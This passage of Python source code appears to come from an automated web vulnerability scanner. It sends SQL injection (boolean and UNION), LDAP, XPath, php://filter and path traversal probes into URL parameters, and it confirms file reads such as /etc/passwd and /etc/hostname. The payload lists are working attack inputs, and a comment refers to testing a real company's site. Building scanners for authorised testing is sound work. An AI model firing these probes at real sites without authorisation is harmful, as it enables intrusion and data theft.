    Complements check_path_traversal_lfi (batch 10) with PHP-specific
    wrapper-based file disclosure - php://filter/convert.base64-encode
    reads a file's raw source (bypassing execution) instead of needing a
    predictable absolute path like /etc/passwd. Proof bar: the response
    must contain a valid base64 blob that decodes to recognizable PHP
    source markers (<?php, <?=) - decoding successfully AND finding
    those markers rules out coincidental base64-looking text.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        for param_name in existing_params:
            for probe in _PHP_WRAPPER_PROBES:
                test_params = dict(existing_params)
                test_params[param_name] = probe
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                if resp.text == baseline_body:
                    continue
                candidate = resp.text.strip()
                for token in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", candidate):
                    try:
                        decoded = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if any(marker in decoded for marker in _PHP_SOURCE_MARKERS):
                        return {
                            "vuln_type": "lfi_php_wrapper_source_disclosure",
                            "severity": "critical",
                            "evidence": (
                                f"{test_url}: parameter '{param_name}' with php://filter "
                                f"wrapper probe {probe!r} returned a base64 blob that "
                                f"decodes to PHP source (contains {'/'.join(_PHP_SOURCE_MARKERS)}) "
                                f"- confirmed local file read via wrapper bypass, not just "
                                f"file existence."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: PHP wrapper LFI check failed for %s: %s", url, exc)
    return None


_LDAP_INJECTION_PROBES = ["*)(uid=*))(|(uid=*", "*)(|(objectclass=*", "*))%00"]
_LDAP_ERROR_SIGNATURES = [
    "LDAPException", "javax.naming.directory", "Invalid DN syntax",
    "LDAP: error code", "com.sun.jndi.ldap",
]


async def check_ldap_injection_error_based(url: str) -> dict | None:
    """
    Sends LDAP filter-breaking syntax and checks for LDAP-library-
    specific error signatures. Baseline-diffed against an unmodified
    request first, same discipline the audit added to check_ssrf_reflected
    and check_xxe_error_based - these error strings are distinctive
    enough to rarely collide, but not risking it after the SSTI lesson.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        for param_name in existing_params:
            for probe in _LDAP_INJECTION_PROBES:
                test_params = dict(existing_params)
                test_params[param_name] = probe
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                for sig in _LDAP_ERROR_SIGNATURES:
                    if sig in resp.text and sig not in baseline_body:
                        return {
                            "vuln_type": "ldap_injection_error_based",
                            "severity": "high",
                            "evidence": (
                                f"{test_url}: parameter '{param_name}' with LDAP filter-"
                                f"breaking probe {probe!r} triggered an LDAP-specific error "
                                f"signature ({sig!r}, absent from baseline)."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: LDAP injection check failed for %s: %s", url, exc)
    return None


_XPATH_INJECTION_PROBES = ["' or '1'='1", "'] | //user/*[contains(*,'"]
_XPATH_ERROR_SIGNATURES = [
    "XPathException", "MS.Internal.Xml.XPath", "System.Xml.XPath",
    "org.apache.xpath", "libxml2",
]


async def check_xpath_injection_error_based(url: str) -> dict | None:
    """
    Same technique and baseline-diffing discipline as
    check_ldap_injection_error_based, targeting XPath query parsers
    instead. XPath-backed auth/search functionality is much rarer than
    SQL, so this has a low hit rate in general - but a genuine hit is
    typically high-value (auth bypass on XML-backed user stores).
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        for param_name in existing_params:
            for probe in _XPATH_INJECTION_PROBES:
                test_params = dict(existing_params)
                test_params[param_name] = probe
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                for sig in _XPATH_ERROR_SIGNATURES:
                    if sig in resp.text and sig not in baseline_body:
                        return {
                            "vuln_type": "xpath_injection_error_based",
                            "severity": "medium",
                            "evidence": (
                                f"{test_url}: parameter '{param_name}' with XPath-breaking "
                                f"probe {probe!r} triggered an XPath-specific error signature "
                                f"({sig!r}, absent from baseline)."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: XPath injection check failed for %s: %s", url, exc)
    return None


_SQLI_BOOLEAN_TRUE = "' AND '1'='1"
_SQLI_BOOLEAN_FALSE = "' AND '1'='2"


async def check_sql_injection_boolean_based(url: str) -> dict | None:
    """
    Complements check_blind_sqli_timing (time-based) and
    check_sqli_error_based (error-signature) with the third classic
    blind-SQLi technique: compare responses for an always-TRUE injected
    condition vs an always-FALSE one against the SAME baseline. If the
    app is vulnerable, the TRUE payload's response matches the baseline
    (query behaves normally) while the FALSE payload's response differs
    (query returns no rows / different content) - a clean three-way
    comparison, not a single substring match, which is what keeps this
    safe from the SSTI-class false-positive problem.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        for param_name in existing_params:
            test_params_true = dict(existing_params)
            test_params_true[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_TRUE
            true_url = parsed.copy_with(params=test_params_true)

            test_params_false = dict(existing_params)
            test_params_false[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_FALSE
            false_url = parsed.copy_with(params=test_params_false)

            try:
                true_resp = await client.get(true_url)
                false_resp = await client.get(false_url)
            except httpx.HTTPError:
                continue

            # A WAF/edge proxy dropping the connection on obvious SQL
            # syntax (' AND '1'='2 etc.) produces a 4xx/5xx status
            # that looks exactly like "the query behaved differently"
            # to a naive status-code diff - but that's the edge layer
            # talking, not the database. If EITHER probe response is
            # 4xx/5xx, this is not a trustworthy boolean-SQLi signal;
            # bail out entirely rather than risk a WAF-block false
            # positive (matches the real Agoda dead-end: TRUE payload
            # got 200, FALSE payload got a WAF 502, tool flagged it as
            # "database responding to boolean conditions").
            if true_resp.status_code >= 400 or false_resp.status_code >= 400:
                continue

            true_matches_baseline = (
                true_resp.status_code == baseline_resp.status_code
                and abs(len(true_resp.text) - len(baseline_body)) < max(20, len(baseline_body) * 0.02)
            )
            false_differs_from_baseline = (
                false_resp.status_code != baseline_resp.status_code
                or abs(len(false_resp.text) - len(baseline_body)) > max(20, len(baseline_body) * 0.02)
            )

            if true_matches_baseline and false_differs_from_baseline:
                return {
                    "vuln_type": "sql_injection_boolean_based",
                    "severity": "critical",
                    "evidence": (
                        f"{url} parameter '{param_name}': baseline body length "
                        f"{len(baseline_body)}. Injecting an always-TRUE condition "
                        f"({_SQLI_BOOLEAN_TRUE!r}) produced a response matching the "
                        f"baseline ({len(true_resp.text)} bytes, status "
                        f"{true_resp.status_code}), while an always-FALSE condition "
                        f"({_SQLI_BOOLEAN_FALSE!r}) produced a different response "
                        f"({len(false_resp.text)} bytes, status {false_resp.status_code}) - "
                        f"the query logic is responding to injected boolean conditions."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: boolean-based SQLi check failed for %s: %s", url, exc)
    return None


_SQLI_UNION_VERSION_MARKER = "swasunionmk"
_SQLI_UNION_TEMPLATES = [
    "' UNION SELECT '{marker}'-- -",
    "' UNION SELECT NULL,'{marker}'-- -",
    "' UNION SELECT NULL,NULL,'{marker}'-- -",
    "' UNION SELECT NULL,NULL,NULL,'{marker}'-- -",
    "%27%20UNION%20SELECT%20%27{marker}%27--%20-",
]


async def check_sqli_union_data_extraction(url: str) -> dict | None:
    """
    Complements check_sql_injection_boolean_based and check_sqli_error_based
    (both candidate-confidence, blind techniques) with the one technique
    that yields a genuinely undeniable artifact: getting the database to
    echo an attacker-chosen literal string directly into the page body
    via UNION SELECT. Tries a small column-count ladder (1-4 columns,
    the overwhelming majority of vulnerable endpoints) with a unique
    per-run marker - if that exact marker comes back in the response
    body and was NOT present in the baseline, the database executed
    attacker SQL and returned attacker-controlled data into the
    response. Nothing to compare/interpret; the marker is either there
    or it isn't.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)
    marker = f"{_SQLI_UNION_VERSION_MARKER}{uuid.uuid4().hex[:8]}"

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        for param_name in existing_params:
            for template in _SQLI_UNION_TEMPLATES:
                payload = template.format(marker=marker)
                test_params = dict(existing_params)
                test_params[param_name] = existing_params[param_name] + payload
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                if resp.status_code >= 400:
                    continue  # WAF/syntax rejection, not a database response
                if marker in resp.text and marker not in baseline_body:
                    return {
                        "vuln_type": "sql_injection_union_data_extraction",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: parameter '{param_name}' with a UNION SELECT "
                            f"payload caused the application to echo back an "
                            f"attacker-chosen literal string ({marker!r}) that was absent "
                            f"from the baseline response - confirmed direct data "
                            f"extraction via SQL injection, not just a blind signal."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: SQLi UNION extraction check failed for %s: %s", url, exc)
    return None


async def check_lfi_arbitrary_file_confirmation(url: str) -> dict | None:
    """
    Complements check_path_traversal_lfi (batch 10), which stops at the
    first hit on ONE hardcoded target (/etc/passwd or win.ini). Reading
    exactly one fixed file could, in rare setups, be a coincidental
    static route rather than genuine arbitrary file read. This probe
    only runs after that check already found a working traversal depth
    for this URL's parameters, then requests a SECOND, different file
    (/etc/hostname or /etc/issue) and requires its content to differ
    from the /etc/passwd response body's shape - proving the read path
    is genuinely arbitrary, not a single hardcoded file being served at
    a traversal-shaped URL by coincidence.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        first_hit = None
        for param_name in existing_params:
            for probe in _PATH_TRAVERSAL_PROBES:
                test_params = dict(existing_params)
                test_params[param_name] = probe
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                if any(sig in resp.text and sig not in baseline_body for sig in _PATH_TRAVERSAL_SIGNATURES):
                    first_hit = (param_name, probe, resp.text)
                    break
            if first_hit:
                break

        if not first_hit:
            return None
        param_name, working_probe, first_file_body = first_hit

        # Swap the filename inside the EXACT payload that already
        # proved to work for this endpoint (same directory depth,
        # same encoding style - raw "../", "..%2f", "....//", or a
        # bare "/etc/passwd") rather than reconstructing a new
        # traversal prefix from scratch, which would risk testing a
        # depth/encoding combination that was never actually proven.
        if "passwd" in working_probe:
            second_file_subs = ["hostname", "issue"]
        elif "win.ini" in working_probe:
            second_file_subs = ["system.ini"]
        else:
            return None

        for second_filename in second_file_subs:
            second_probe = working_probe.replace("passwd", second_filename).replace("win.ini", second_filename)
            test_params = dict(existing_params)
            test_params[param_name] = second_probe
            test_url = parsed.copy_with(params=test_params)
            try:
                resp = await client.get(test_url)
            except httpx.HTTPError:
                continue
            if resp.status_code >= 400 or not resp.text.strip():
                continue
            if resp.text.strip() == baseline_body.strip():
                continue
            if resp.text.strip() == first_file_body.strip():
                continue  # identical to the /etc/passwd response - not a genuinely different file
            second_line = resp.text.strip().splitlines()[0][:120]
            return {
                "vuln_type": "path_traversal_lfi_arbitrary_file_confirmed",
                "severity": "critical",
                "evidence": (
                    f"{test_url}: parameter '{param_name}' already confirmed to read "
                    f"/etc/passwd was also used to read a SECOND, unrelated file "
                    f"({second_probe!r}), returning distinct content ({second_line!r}) - "
                    f"confirms genuinely arbitrary file read, not a single coincidental "
                    f"hardcoded route."
                ),
            }
    except httpx.HTTPError as exc:
        logger.info("detective: LFI second-file confirmation check failed for %s: %s", url, exc)
    return None


